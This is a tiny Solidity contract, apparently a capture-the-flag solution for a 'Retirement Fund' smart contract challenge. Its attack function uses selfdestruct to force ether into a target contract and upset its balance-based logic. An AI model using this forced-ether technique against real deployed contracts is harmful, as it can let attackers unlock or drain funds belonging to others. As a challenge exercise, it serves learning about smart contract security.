pragma solidity 0.4.21;

contract RetirementFundChallengeAttacker {
    function attack(address target) payable {
        selfdestruct(target);
    }
}